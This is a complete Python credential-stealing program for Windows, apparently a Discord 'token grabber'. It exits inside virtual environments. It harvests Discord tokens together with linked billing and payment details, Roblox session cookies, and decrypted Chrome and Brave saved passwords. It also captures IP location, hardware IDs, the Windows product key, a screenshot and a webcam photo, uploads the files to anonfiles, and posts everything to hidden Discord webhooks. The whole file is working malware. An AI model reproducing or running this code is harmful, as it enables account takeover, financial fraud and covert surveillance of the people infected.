# -*- coding: utf-8 -*-
import sys # check for vm
def get_base_prefix_compat():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
def in_virtualenv():
    return get_base_prefix_compat() != sys.prefix
if in_virtualenv() == True:
    sys.exit()

import json
import os
from urllib.request import urlopen
import re
import requests
from subprocess import Popen, PIPE
import platform
import pyautogui
import requests
import random
import string
import base64
import shutil
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from Crypto import Random
from datetime import datetime
import browser_cookie3, requests, threading
import time
from pathlib import Path
import cv2

# get places the code needs to access
LOCAL = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")
ROAMING = os.getenv("APPDATA")

# first hooks is the link in base64 format, everything after are backup webhooks
hooks = [""]
discord_data = ""
pc_data = ""
password_data = ""
roblox_data = ""
photo_data = ""

def upload_file(file): # upload files to anonfiles
    url = 'https://api.anonfiles.com/upload'
    chromelogin_path = file
    files = {'file': (open(chromelogin_path, 'rb'))}
    r2 = requests.post(url, files=files)
    resp2 = json.loads(r2.text)
    if resp2['status']:
        loginUrl2 = resp2['data']['file']['url']['short']
        return loginUrl2
    else:
        return "Anonfiles is down"

def discord_():
    global discord_data
    def find_tokens(path):
        path += '\\Local Storage\\leveldb'
        tokens = []
        for file_name in os.listdir(path):
            try:
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            tokens.append({"token": token, "place": path})
            except:
                continue
        return tokens

    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'BetterDiscord': roaming + '\\BetterDiscord',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Edge': local + '\\Microsoft\\Edge\\User Data\\Default'
    }
    tokensFound = []
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                if not token["token"] in tokensFound:
                    tokensFound.append({"token": token, "platform": platform})
        else:
            continue

    failed_tokens = []

    embed_data = []
    for token in tokensFound:
        data = token
        token = token["token"]
        headers = { 
            "Content-Type": "application/json", 
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
            "Authorization": token['token']
        }
        try:
            user_data = requests.get("https://discord.com/api/users/@me", headers=headers)
            if user_data.status_code == 200:
                userdata = user_data.json()
            else:
                raise Exception
        except:
            failed_tokens.append(token)
        else:
            try:
                if userdata["premium_type"] == 1:
                    nitro = "Nitro Classic"
                elif userdata["premium_type"] == 2:
                    nitro = "Nitro Boost"
                else:
                    nitro = "None"
            except:
                nitro = "None"
            creation_date = datetime.utcfromtimestamp(((int(userdata['id']) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            embed = {"platform": data['platform'], "username": f"{userdata['username']}#{userdata['discriminator']}", "id": userdata['id'], "avatar": f"https://cdn.discordapp.com/avatars/{userdata['id']}/{userdata['avatar']}", "email": userdata['email'], "phone": userdata['phone'], "nitro": nitro, "token": token, "createdate": creation_date}
            embed_data.append(embed)
    discord_data = {"data": embed_data, "failed": failed_tokens}

def roblox():
    global roblox_data
    cookiez = []
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookie = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        cookiez.append(f"Edge: {cookie}")
    except:
        pass
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookie = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        cookiez.append(f"Chrome: {cookie}")
    except:
        pass
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookie = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        cookiez.append(f"Firefox: {cookie}")
    except:
        pass
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookie = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        cookiez.append(f"Opera: {cookie}")
    except:
        pass
    roblox_data = cookiez

def pc():
    global pc_data
    ip = org = loc = city = country = region = googlemap = "None"
    try:
        url = 'http://ipinfo.io/json'
        response = urlopen(url)
        data = json.load(response)
        ip = data['ip']
        org = data['org']
        loc = data['loc']
        city = data['city']
        country = data['country']
        region = data['region']
        googlemap = "https://www.google.com/maps/search/google+map++" + loc
    except:
        pass

    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
    hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")

    p = Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
    winkey = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")

    p = Popen("wmic cpu get name", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
    cpu = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")

    try:
        p = Popen("wmic path win32_VideoController get name", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
        gpu = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")
    except:
        gpu = "None"

    pc_username = os.getenv("UserName") 
    pc_name = os.getenv("COMPUTERNAME")
    computer_os = platform.system()
    if "darwin" in computer_os.lower():
        computer_os = "Mac"

    pc_data = {"ip": {"ip": ip,"org": org,"loc": loc,"city": city,"country": country,"region": region,"googlemap": googlemap}, "hwid": hwid, "username": pc_username, "name": pc_name, "winkey": winkey, "cpu": cpu, "gpu": gpu, "os": computer_os}


def password():
    global password_data
    encrypt_loginInfo = True
    LOCAL = os.getenv("LOCALAPPDATA")
    TEMP = os.getenv("TEMP")
    class chrome():
        def bothInstalled():
            chrome = False
            brave = False
            if os.path.exists(LOCAL + r'\BraveSoftware\Brave-Browser\User Data\default\Login Data'):
                brave = True
            if os.path.exists(LOCAL + r'\Google\Chrome\User Data\Local State'):
                chrome = True
            if chrome is True & brave is True:
                return True
        def get_master_key():
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                    "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        def decrypt_payload(cipher, payload):
            return cipher.decrypt(payload)
        def generate_cipher(aes_key, iv):
            return AES.new(aes_key, AES.MODE_GCM, iv)
        def decrypt_password(buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = chrome.generate_cipher(master_key, iv)
                decrypted_pass = chrome.decrypt_payload(cipher, payload)
                decrypted_pass = decrypted_pass[:-16].decode()
                return decrypted_pass
            except Exception:
                return "Chrome < 80"
        def get_password():
            master_key = chrome.get_master_key()
            login_db = os.environ[
                        'USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
            shutil.copy2(login_db,
                        TEMP + r"\Loginvault.db")
            conn = sqlite3.connect(TEMP + r"\Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                if not chrome.bothInstalled():
                    w = open(TEMP + r"\login.txt", "w+")
                else:
                    w = open(TEMP + r"\chromelogin.txt", "w+")
                data = []
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = chrome.decrypt_password(encrypted_password, master_key)
                    if username != "" or decrypted_password != "":
                        data.append({"site": url, "username": username, "password": decrypted_password})
                w.write(json.dumps(data, indent=4))
            except Exception as e:
                pass
            cursor.close()
            conn.close()
            os.remove(TEMP + r"\Loginvault.db")
    class brave():
        def bothInstalled():
            chrome = False
            brave = False
            if os.path.exists(LOCAL + r'\BraveSoftware\Brave-Browser\User Data\default\Login Data'):
                brave = True
            if os.path.exists(LOCAL + r'\Google\Chrome\User Data\Local State'):
                chrome = True
            if chrome is True & brave is True:
                return True
        def get_master_key():
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
                    "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        def decrypt_payload(cipher, payload):
            return cipher.decrypt(payload)
        def generate_cipher(aes_key, iv):
            return AES.new(aes_key, AES.MODE_GCM, iv)
        def decrypt_password(buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = brave.generate_cipher(master_key, iv)
                decrypted_pass = brave.decrypt_payload(cipher, payload)
                decrypted_pass = decrypted_pass[:-16].decode()
                return decrypted_pass
            except Exception:
                return "Chrome < 80"
        def get_password():
            master_key = brave.get_master_key()
            login_db = os.environ[
                        'USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data'
            shutil.copy2(login_db,
                        TEMP + r"\Loginvault.db")
            conn = sqlite3.connect(TEMP + r"\Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                if not brave.bothInstalled():
                    w = open(TEMP + r"\login.txt", "w+")
                else:
                    w = open(TEMP + r"\bravelogin.txt", "w+")
                data = []
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = brave.decrypt_password(encrypted_password, master_key)
                    if username != "" or decrypted_password != "":
                        data.append({"site": url, "username": username, "password": decrypted_password})
                w.write(json.dumps(data, indent=4))
            except Exception:
                pass
            cursor.close()
            conn.close()
            os.remove(TEMP + r"\Loginvault.db")
    class encryption():
        def pad(s):
            return s + b"\0" * (AES.block_size - len(s) % AES.block_size)
        def encrypt(message, key):
            message = encryption.pad(message)
            iv = Random.new().read(AES.block_size)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            return iv + cipher.encrypt(message)
        def encrypt_file(file, key=None):
            if key is None:
                key = f"{''.join(random.choices(string.ascii_letters + string.digits, k=32))}".encode()
            with open(file, 'rb') as f:
                plaintext = f.read()
            encr = encryption.encrypt(plaintext, key)
            with open(file[:-4] + ".enc", 'wb') as f:
                f.write(encr)
            return key.decode()
    def installedBrowser():
        chrome = False
        brave = False
        if os.path.exists(LOCAL + r'\BraveSoftware\Brave-Browser\User Data\default\Login Data'):
            brave = True
        if os.path.exists(LOCAL + r'\Google\Chrome\User Data\Local State'):
            chrome = True
        if chrome is True & brave is True:
            return "Both"
        elif chrome is True:
            return "Chrome"
        elif brave is True:
            return "Brave"
    browserInstalled = installedBrowser()
    def getlogininfo():
        global chromeKey
        global braveKey
        if browserInstalled == "Chrome":
            chromeFile = TEMP + r"\login.txt"
            chrome.get_password() 
            if encrypt_loginInfo is True:
                chromeKey = encryption.encrypt_file(chromeFile)
                return upload_file(TEMP+r"\login"+".enc")
            else:
                return upload_file(TEMP + r"\login.txt")
        if browserInstalled == "Brave":
            brave.get_password()
            braveFile = TEMP + r"\login.txt"
            if encrypt_loginInfo is True:
                braveKey = encryption.encrypt_file(braveFile)
                return upload_file(TEMP+r"\login"+".enc")
            else:
                return upload_file(TEMP + r"\login.txt")
        if browserInstalled == "Both":
            chrome.get_password()
            brave.get_password()
            braveFile = TEMP + r"\bravelogin.txt"
            chromeFile = TEMP + r"\chromelogin.txt"
            if encrypt_loginInfo is True:
                braveKey = encryption.encrypt_file(braveFile)
                chromeKey = encryption.encrypt_file(chromeFile)
                return upload_file(braveFile[:-4] + ".enc") + "\n" + upload_file(chromeFile[:-4] + ".enc")
            else:
                return upload_file(braveFile) + "\n" + upload_file(chromeFile)
    def main():
        loginurl = getlogininfo()
        keys = ""
        if encrypt_loginInfo is True:
            if browserInstalled == "Brave":
                keys = f"Brave: {braveKey}"
            elif browserInstalled == "Chrome":
                keys = f"Chrome: {chromeKey}"
            elif browserInstalled == "Both":
                keys = f"Chrome: {chromeKey}\nBrave: {braveKey}"
        return {"urls": loginurl, "keys": keys}
    try:
        password_data = main()
    except:
        password_data = {"urls": "None", "keys": "None"}

def photo_g():
    global photo_data
    try:
        camera = cv2.VideoCapture(0)
        return_value,image = camera.read()
        gray = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
        cv2.imwrite(f'{TEMP}\\cam.jpg',image)
        camera.release()
        cv2.destroyAllWindows()
        photo_data = upload_file(f'{TEMP}\\cam.jpg')
    except:
        photo_data = "No Camera Detected"

def construct():
    global discord_data
    global pc_data
    global password_data
    global roblox_data
    global photo_data

    t1 = threading.Thread(target=discord_)
    t2 = threading.Thread(target=pc)
    t3 = threading.Thread(target=password)
    t4 = threading.Thread(target=roblox)
    t5 = threading.Thread(target=photo_g)
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    try:
        t1.join()
    except:
        pass
    try:
        t2.join()
    except:
        pass
    try:
        t3.join()
    except:
        pass
    try:
        t4.join()
    except:
        pass
    try:
        t5.join()
    except:
        pass

    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(TEMP + r'\ss.png')
    screenshot = upload_file(TEMP + r'\ss.png')

    embeds = []
    winkey = ""
    if pc_data['winkey'] == "": winkey = "None Found"
    else: winkey = pc_data['winkey']
    
    if roblox_data == []:
        roblox_data = "None Found"
    else:
        roblox_d = roblox_data
        roblox_data = ""
        for x in roblox_d:
            roblox_data += f"{x.strip('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')}\n"

    for discord in discord_data['data']:
        platform = ""
        if "Edge" in discord['platform']:
            platform = "Edge"
        elif "YandexBrowser" in discord['platform']:
            platform = "Yandex"
        elif "BraveSoftware" in discord['platform']:
            platform = "Brave"
        elif "Opera Software" in discord['platform']:
            platform = "Opera"
        elif "Chrome" in discord['platform']:
            platform = "Chrome"
        elif "BetterDiscord" in discord['platform']:
            platform = "BetterDiscord"
        elif "discordptb" in discord['platform']:
            platform = "Discord PTB"
        elif "discordcanary" in discord['platform']:
            platform = "Discord Canary"
        else:
            platform = "Discord"
        data2write = ""
        headers = { 
            "Content-Type": "application/json", 
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
            "Authorization": discord['token']['token']
        }
        try:
            req = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers)
            if req.status_code == 200 and req.text != "[]":
                paymentData = req.json()
                for payment in paymentData:
                    if payment["type"] == 1:
                        data2write = data2write + f"""Type: Credit/Debit Card
Invalid: {payment["invalid"]}
ID: {payment["id"]}
Default: {payment["default"]}
Brand: {payment["brand"]}
Last 4 Digits: {payment["last_4"]}
Expire Date: {payment['expires_month']}/{payment['expires_year']}
Country: {payment["country"]}
Billing Address:
- Name: {payment['billing_address']['name']}
- Line1: {payment['billing_address']['line_1']}
- Line2: {payment['billing_address']['line_2']}
- City/Town: {payment['billing_address']['city']}
- State/County: {payment['billing_address']['state']}
- Country: {payment['billing_address']['country']}
- Postal Code: {payment['billing_address']['postal_code']}
- Map: {'https://www.google.com/maps/search/google+map++' + payment['billing_address']['line_1'].replace(" ", "%20") + "%20" + payment['billing_address']['postal_code'].replace(" ", "%20")}\n\n"""
                    elif payment["type"] == 2:
                        data2write = data2write + f"""Type: PayPal
Invalid: {payment["invalid"]}
ID: {payment["id"]}
Email: {payment["email"]}
Default: {payment["default"]}
Country: {payment["country"]}
Billing Address:
- Name: {payment['billing_address']['name']}
- Line1: {payment['billing_address']['line_1']}
- Line2: {payment['billing_address']['line_2']}
- City/Town: {payment['billing_address']['city']}
- State/County: {payment['billing_address']['state']}
- Country: {payment['billing_address']['country']}
- Postal Code: {payment['billing_address']['postal_code']}
- Map: {'https://www.google.com/maps/search/google+map++' + payment['billing_address']['line_1'].replace(" ", "%20") + "%20" + payment['billing_address']['postal_code'].replace(" ", "%20")}\n\n"""
                if data2write == "":
                    data2write = "No Payment Data"
        except Exception as e:
            data2write = "No Payment Data"
        if data2write == "":
            data2write = "No Payment Data"    
        payload = {
            "color": "5814783",
            "fields": [
                {
                    "name": "Discord Data",
                    "value": f"UserID: {discord['id']}\nEmail: {discord['email']}\nPhone: {discord['phone']}\nCreate Date: {discord['createdate']}\nNitro: {discord['nitro']}\nLocation: {platform}",
                    "inline": True
                },
                {
                    "name": "IP Data",
                    "value": f"IP: {pc_data['ip']['ip']}\nOrg: {pc_data['ip']['org']}\nCoords: {pc_data['ip']['loc']}\nCity: {pc_data['ip']['city']}\nRegion: {pc_data['ip']['region']}\nCountry: {pc_data['ip']['country']}\nMaps: {pc_data['ip']['googlemap']}",
                    "inline": True
                },
                {
                    "name": "⠀ ",
                    "value": "⠀"
                },
                {
                    "name": "PC Data",
                    "value": f"Username: {pc_data['username']}\nPC Name: {pc_data['name']}\nHWID: {pc_data['hwid']}\nCPU: {pc_data['cpu']}\nGPU: {pc_data['gpu']}\nOS: {pc_data['os']}",
                    "inline": True
                },
                {
                    "name": "Billing Data",
                    "value": f"{data2write}",
                    "inline": True
                },
                {
                    "name": "Discord Token",
                    "value": f"{discord['token']['token']}",
                    "inline": False
                },
                {
                    "name": "Windows Licence Key",
                    "value": f"{winkey}",
                    "inline": False
                },
                {
                    "name": "Screenshot",
                    "value": f"{screenshot}",
                    "inline": False
                },
                {
                    "name": "Camera",
                    "value": f"{photo_data}",
                    "inline": False
                },
                {
                    "name": "Chrome/Brave Passwords",
                    "value": f"{password_data['urls']}\n{password_data['keys']}",
                    "inline": False
                },
                {
                    "name": "Roblox Cookies",
                    "value": f"{roblox_data}",
                    "inline": False
                }
            ],
            "footer": {
                "text": f"lol got em",
                "icon_url": "https://i.imgur.com/oB8Mdjm.png"
            },
            "author": {
                "name": f"{discord['username']}",
                "icon_url": f"{discord['avatar']}"
            },
        }
        embeds.append(payload)
    if embeds == []:
        payload = {
            "color": "5814783",
            "fields": [
                {
                    "name": "Discord Data",
                    "value": f"None Found",
                    "inline": True
                },
                {
                    "name": "IP Data",
                    "value": f"IP: {pc_data['ip']['ip']}\nOrg: {pc_data['ip']['org']}\nCoords: {pc_data['ip']['loc']}\nCity: {pc_data['ip']['city']}\nRegion: {pc_data['ip']['region']}\nCountry: {pc_data['ip']['country']}\nMaps: {pc_data['ip']['googlemap']}",
                    "inline": True
                },
                {
                    "name": "⠀ ",
                    "value": "⠀"
                },
                {
                    "name": "PC Data",
                    "value": f"Username: {pc_data['username']}\nPC Name: {pc_data['name']}\nHWID: {pc_data['hwid']}\nCPU: {pc_data['cpu']}\nGPU: {pc_data['gpu']}\nOS: {pc_data['os']}",
                    "inline": True
                },
                {
                    "name": "Billing Data",
                    "value": f"None Found",
                    "inline": True
                },
                {
                    "name": "Discord Token",
                    "value": f"None Found",
                    "inline": False
                },
                {
                    "name": "Windows Licence Key",
                    "value": f"{winkey}",
                    "inline": False
                },
                {
                    "name": "Screenshot",
                    "value": f"{screenshot}",
                    "inline": False
                },
                {
                    "name": "Camera",
                    "value": f"{photo_data}",
                    "inline": False
                },
                {
                    "name": "Chrome/Brave Passwords",
                    "value": f"{password_data['urls']}\n{password_data['keys']}",
                    "inline": False
                },
                {
                    "name": "Roblox Cookies",
                    "value": f"{roblox_data}",
                    "inline": False
                }
            ],
            "footer": {
                "text": f"lol got em",
                "icon_url": "https://i.imgur.com/oB8Mdjm.png"
            },
            "author": {
                "name": f"No Discord Data"
            },
        }
        embeds.append(payload)
    data = {
        "embeds": embeds,
        "content": "ha ha yes",
        "username": "Token Nicker",
        "avatar_url": "https://i.imgur.com/oB8Mdjm.png"
    }
    headers = { 
        "Content-Type": "application/json", 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    allTokens = []
    for y in embeds:
        if y["fields"][5]["value"] in allTokens:
            continue
        allTokens.append(y["fields"][5]["value"])
        z = []
        z.append(y)
        data = {
            "embeds": z,
            "content": "||=====================================================\n=====================================================||",
            "username": "Token Nicker",
            "avatar_url": "https://i.imgur.com/oB8Mdjm.png"
        }
        for x in hooks:
            message_bytes = base64.b64decode(x) # decode to bytes
            message = message_bytes.decode('ascii') # ascii format
            
            req = requests.post(url=message, data=json.dumps(data), headers=headers) # send data
            if "You are being rate limited." in req.text: # if rate limit
                while True: 
                    time.sleep(3) # wait 3 secs
                    req = requests.post(url=message, data=json.dumps(data), headers=headers) # send again
                    if "You are being rate limited." in req.text: # if rate limited
                        pass # retry (loop)
                    else:
                        break # else, break
                break # end loop of webhooks
            elif req.status_code != 204: # if not valid, try other webhooks
                continue
            else: # otherwise
                break # end loop

construct() # main thing
try: # remove temp files
    os.remove(TEMP + r"\login.txt")
except Exception:
    pass
try:
    os.remove(TEMP + r"\bravelogin.txt")
except Exception:
    pass
try:
    os.remove(TEMP + r"\bravelogin.enc")
except Exception:
    pass
try:
    os.remove(TEMP + r"\chromelogin.txt")
except Exception:
    pass
try:
    os.remove(TEMP + r"\chromelogin.enc")
except Exception:
    pass
try:
    os.remove(TEMP + r"\ss.png")
except Exception:
    pass
